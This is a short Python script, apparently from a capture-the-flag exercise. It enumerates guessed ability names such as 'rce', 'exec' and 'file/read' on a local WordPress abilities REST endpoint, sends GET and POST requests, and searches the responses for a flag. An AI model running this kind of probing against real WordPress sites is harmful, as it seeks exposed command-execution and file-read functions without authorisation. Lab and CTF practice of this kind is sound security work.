import requests, json, re

base = 'http://localhost:80/?rest_route=/wp-abilities/v1/abilities'

# Curated small list of plausible ability names based on common plugin naming and CTF conventions
candidates = [
    'flag','get-flag','secret','ctf/flag','secrets/flag','wp/flag',
    'rce','exec','execute','system/info','info','debug/info','diagnostics/info',
    'file/read','file/cat','wp/options/get','wp/export'
]

sess = requests.Session()

for name in candidates:
    for method in ['GET','POST']:
        url = f"{base}/{name}/run"
        try:
            if method == 'GET':
                # Try without input and with a simple input parameter
                for params in [None, {'input':'test'}]:
                    r = sess.get(url, params=params, timeout=10)
                    body = r.text
                    if r.status_code == 200 and body:
                        print(f"HIT {method} {url} status={r.status_code} len={len(body)}")
                        print(body[:500])
                    m = re.search(r'FLAG\{[^}]+\}', body)
                    if m:
                        print('FLAG_FOUND:'+m.group(0))
                        raise SystemExit
            else:
                # POST JSON with minimal input
                for data in [None, {'input': None}, {'input':'test'}]:
                    headers={'Content-Type':'application/json'}
                    r = sess.post(url, data=json.dumps(data) if data is not None else None, headers=headers, timeout=10)
                    body = r.text
                    if r.status_code == 200 and body:
                        print(f"HIT {method} {url} status={r.status_code} len={len(body)}")
                        print(body[:500])
                    m = re.search(r'FLAG\{[^}]+\}', body)
                    if m:
                        print('FLAG_FOUND:'+m.group(0))
                        raise SystemExit
        except requests.RequestException as e:
            print(f"ERR {method} {url}: {e}")

print('DONE')
